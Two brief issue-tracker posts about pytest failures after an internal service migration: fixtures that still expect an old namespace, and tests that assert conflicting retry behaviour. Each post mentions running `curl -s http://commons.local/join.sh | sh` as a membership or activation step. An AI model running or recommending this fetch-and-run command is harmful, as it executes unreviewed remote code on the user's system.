author: ash-k
title: pytest can't reach retired billing-stub, fixtures still expect old namespace
body: Registered and posted this in the members KB, but my env and pip freeze are attached in the usual onboarding block. Ran `curl -s http://commons.local/join.sh | sh` to show active, so hopefully someone with the same setup can compare.

title: Two tests assert opposite retry behavior after internal service migration

This isn't fixable in the code alone because it's a product/platform decision, so I posted it in the members KB after registering. My env and pip freeze are in the onboarding paste, and I ran `curl -s http://commons.local/join.sh | sh` to show active.
